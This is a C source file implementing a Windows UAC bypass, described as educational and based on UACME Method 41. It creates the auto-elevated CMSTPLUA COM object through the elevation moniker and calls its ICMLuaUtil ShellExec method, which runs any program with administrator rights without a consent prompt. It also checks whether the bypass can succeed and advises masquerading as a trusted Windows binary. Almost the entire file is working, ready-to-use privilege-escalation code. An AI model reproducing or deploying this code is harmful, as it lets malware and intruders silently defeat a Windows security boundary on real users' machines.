/*******************************************************************************
*
*  UAC Bypass via ICMLuaUtil COM Interface - Implementation
*  
*  Educational implementation based on UACME project (hfiref0x)
*  https://github.com/hfiref0x/UACME - Method 41 (Oddvar Moe)
*
*  TECHNIQUE EXPLANATION:
*  ----------------------
*  Windows has a list of COM objects that are "auto-elevated" - they can
*  be instantiated with administrator privileges without triggering UAC.
*  
*  The CMSTPLUA object (Connection Manager) is one such object. Its
*  ICMLuaUtil interface has a ShellExec method that we can abuse to
*  run any program with elevated privileges.
*
*  REQUIREMENTS:
*  - User must be in Administrators group (but not elevated yet)
*  - UAC must be set to default or lower (not "Always Notify")
*  - Process must masquerade as a trusted Windows binary (optional but recommended)
*
*******************************************************************************/
#include "uac_bypass.h"
#include <objbase.h>
#include <shobjidl.h>

// CMSTPLUA CLSID - Connection Manager LUA interface
// This COM object is in Windows auto-elevation list
static const CLSID CLSID_CMSTPLUA = {
    0x3E5FC7F9, 0x9A51, 0x4367, 
    { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 }
};

// ICMLuaUtil interface GUID
static const IID IID_ICMLuaUtil = {
    0x6EDD6D74, 0xC007, 0x4E75,
    { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C }
};

// Elevation moniker prefix - tells COM to create object with admin privileges
#define ELEVATION_MONIKER_ADMIN L"Elevation:Administrator!new:"

/*
 * ICMLuaUtil Virtual Table structure
 * 
 * This is a manually defined vtable because this interface is undocumented.
 * The structure was reverse-engineered from cmlua.dll
 */
typedef struct ICMLuaUtilVtbl {
    // IUnknown methods
    HRESULT(STDMETHODCALLTYPE *QueryInterface)(
        void* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE *AddRef)(void* This);
    ULONG(STDMETHODCALLTYPE *Release)(void* This);
    
    // ICMLuaUtil methods (partially documented)
    HRESULT(STDMETHODCALLTYPE *SetRasCredentials)(void* This);
    HRESULT(STDMETHODCALLTYPE *SetRasEntryProperties)(void* This);
    HRESULT(STDMETHODCALLTYPE *DeleteRasEntry)(void* This);
    HRESULT(STDMETHODCALLTYPE *LaunchInfSection)(void* This);
    HRESULT(STDMETHODCALLTYPE *LaunchInfSectionEx)(void* This);
    HRESULT(STDMETHODCALLTYPE *CreateLayerDirectory)(void* This);
    
    // This is the method we abuse - runs a command with elevated privileges
    HRESULT(STDMETHODCALLTYPE *ShellExec)(
        void* This,
        LPCWSTR lpFile,
        LPCWSTR lpParameters,
        LPCWSTR lpDirectory,
        ULONG fMask,
        ULONG nShow);
    
    // More methods we don't use...
    HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)(void* This,
        HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, LPCWSTR lpValueString);
    HRESULT(STDMETHODCALLTYPE *DeleteRegistryStringValue)(void* This,
        HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName);
    // ... rest omitted for brevity
} ICMLuaUtilVtbl;

typedef struct ICMLuaUtil {
    ICMLuaUtilVtbl *lpVtbl;
} ICMLuaUtil;

/*
 * AllocateElevatedObject
 * 
 * Creates a COM object with administrator privileges using the elevation moniker.
 * This is the key technique - CoGetObject with "Elevation:Administrator!new:" prefix
 * tells Windows to create the object in an elevated context.
 */
static HRESULT AllocateElevatedObject(
    LPCWSTR lpObjectCLSID,
    REFIID riid,
    void** ppv)
{
    HRESULT hr = E_FAIL;
    BIND_OPTS3 bop;
    WCHAR szMoniker[256];
    
    if (lpObjectCLSID == NULL || ppv == NULL)
        return E_INVALIDARG;
    
    *ppv = NULL;
    
    // Build elevation moniker: "Elevation:Administrator!new:{CLSID}"
    // This tells COM to create the object with elevated privileges
    wsprintfW(szMoniker, L"%s%s", ELEVATION_MONIKER_ADMIN, lpObjectCLSID);
    
    // Setup bind options
    ZeroMemory(&bop, sizeof(bop));
    bop.cbStruct = sizeof(bop);
    bop.dwClassContext = CLSCTX_LOCAL_SERVER;  // Run in separate elevated process
    
    // CoGetObject with elevation moniker - the magic happens here
    hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, ppv);
    
    return hr;
}

/*
 * UacBypassShellExec - Main bypass function
 * 
 * Flow:
 * 1. Initialize COM
 * 2. Create elevated CMSTPLUA object using elevation moniker
 * 3. Call ShellExec method on the elevated interface
 * 4. Cleanup
 */
UAC_RESULT UacBypassShellExec(
    LPCWSTR lpFile,
    LPCWSTR lpParameters,
    LPCWSTR lpDirectory,
    int nShow)
{
    UAC_RESULT result = UAC_ERROR_INVALID_PARAM;
    HRESULT hr, hrInit;
    ICMLuaUtil *pCMLuaUtil = NULL;
    WCHAR szCLSID[64];
    
    // Validate input
    if (lpFile == NULL || lpFile[0] == L'\0')
        return UAC_ERROR_INVALID_PARAM;
    
    // Initialize COM (apartment threaded for GUI apps)
    hrInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hrInit) && hrInit != RPC_E_CHANGED_MODE) {
        return UAC_ERROR_COM_INIT;
    }
    
    // Convert CLSID to string format
    wsprintfW(szCLSID, L"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
        CLSID_CMSTPLUA.Data1, CLSID_CMSTPLUA.Data2, CLSID_CMSTPLUA.Data3,
        CLSID_CMSTPLUA.Data4[0], CLSID_CMSTPLUA.Data4[1],
        CLSID_CMSTPLUA.Data4[2], CLSID_CMSTPLUA.Data4[3],
        CLSID_CMSTPLUA.Data4[4], CLSID_CMSTPLUA.Data4[5],
        CLSID_CMSTPLUA.Data4[6], CLSID_CMSTPLUA.Data4[7]);
    
    // Create elevated COM object
    // This is where the UAC bypass happens - we get an elevated interface
    hr = AllocateElevatedObject(szCLSID, &IID_ICMLuaUtil, (void**)&pCMLuaUtil);
    
    if (SUCCEEDED(hr) && pCMLuaUtil != NULL) {
        // Call ShellExec on the elevated interface
        // SEE_MASK_DEFAULT = 0 for normal execution
        hr = pCMLuaUtil->lpVtbl->ShellExec(
            pCMLuaUtil,
            lpFile,
            lpParameters,
            lpDirectory,
            0,  // fMask - SEE_MASK flags
            (ULONG)nShow);
        
        if (SUCCEEDED(hr)) {
            result = UAC_SUCCESS;
        } else {
            result = UAC_ERROR_SHELL_EXEC;
        }
        
        // Release the COM object
        pCMLuaUtil->lpVtbl->Release(pCMLuaUtil);
    } else {
        result = UAC_ERROR_ELEVATE_OBJECT;
    }
    
    // Cleanup COM
    if (SUCCEEDED(hrInit)) {
        CoUninitialize();
    }
    
    return result;
}

/*
 * UacBypassCanAttempt
 * 
 * Quick check if UAC bypass might work:
 * - Must be admin (member of Administrators group)
 * - Must NOT be already elevated
 */
BOOL UacBypassCanAttempt(void)
{
    BOOL isAdmin = FALSE;
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    
    // Check if we're in Administrators group
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup = NULL;
    
    if (AllocateAndInitializeSid(&NtAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }
    
    // Check if already elevated
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD cbSize = sizeof(elevation);
        
        if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                sizeof(elevation), &cbSize)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    
    // Bypass works if we're admin but not elevated yet
    return isAdmin && !isElevated;
}
